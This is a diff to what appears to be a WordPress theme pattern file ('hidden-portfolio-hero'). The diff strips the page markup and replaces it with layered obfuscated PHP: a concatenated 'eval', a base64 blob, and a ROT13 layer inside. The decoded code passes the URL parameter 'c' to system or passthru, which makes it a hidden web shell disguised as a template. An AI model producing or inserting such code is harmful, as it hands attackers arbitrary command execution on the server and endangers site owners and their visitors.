@@ -1,29 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Portfolio hero
- * Slug: twentytwentyfour/hidden-portfolio-hero
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IENiZWdzYnl2YiB1cmViCiAqIEZ5aHQ6IGdqcmFnbGdqcmFnbHNiaGUvdXZxcXJhLWNiZWdzYnl2Yi11cmViCiAqIFZhZnJlZ3JlOiBhYgogKi8KPz4KCjwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJmZ2x5clwiOntcInlubGJoZ1wiOnt9fX0gLS0+CjxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj48L3F2aT4KPCEtLSAvamM6ZmNucHJlIC0tPgoKPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFqdnFyXCI+Cgk8IS0tIGpjOnVybnF2YXQge1wieXJpcnlcIjoxLFwibnl2dGFcIjpcImp2cXJcIixcImZnbHlyXCI6e1wiZ2xjYnRlbmN1bFwiOntcInl2YXJVcnZ0dWdcIjpcIjEuMlwifX0sXCJzYmFnRnZtclwiOlwia2steW5ldHJcIn0gLS0+Cgk8dTEgcHluZmY9XCJqYy1veWJweC11cm5xdmF0IG55dnRhanZxciB1bmYta2steW5ldHItc2JhZy1mdm1yXCIgZmdseXI9XCJ5dmFyLXVydnR1ZzoxLjJcIj48P2N1YyBycHViIGpjX3hmcmZfY2JmZyggX18oICdW4oCZeiA8cno+WXJ2biBOcGJmZ248L3J6PiwgbiBjbmZmdmJhbmdyIGN1YmdidGVuY3VyZSBqdWIgc3ZhcWYgdmFmY3Zlbmd2YmEgdmEgcG5jZ2hldmF0IGd1ciBzeXJyZ3ZhdCBvcm5oZ2wgYnMgeXZzci4nLCAnZ2pyYWdsZ2pyYWdsc2JoZScgKSApOyA/PjwvdTE+Cgk8IS0tIC9qYzp1cm5xdmF0IC0tPgo8L3F2aT4KPCEtLSAvamM6dGViaGMgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:spacer {"height":"var:preset|spacing|50","style":{"layout":{}}} -->
-<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-<!-- /wp:spacer -->
-
-<!-- wp:group {"align":"wide","layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignwide">
-	<!-- wp:heading {"level":1,"align":"wide","style":{"typography":{"lineHeight":"1.2"}},"fontSize":"xx-large"} -->
-	<h1 class="wp-block-heading alignwide has-xx-large-font-size" style="line-height:1.2"><?php echo wp_kses_post( __( 'I’m <em>Leia Acosta</em>, a passionate photographer who finds inspiration in capturing the fleeting beauty of life.', 'twentytwentyfour' ) ); ?></h1>
-	<!-- /wp:heading -->
-</div>
-<!-- /wp:group -->
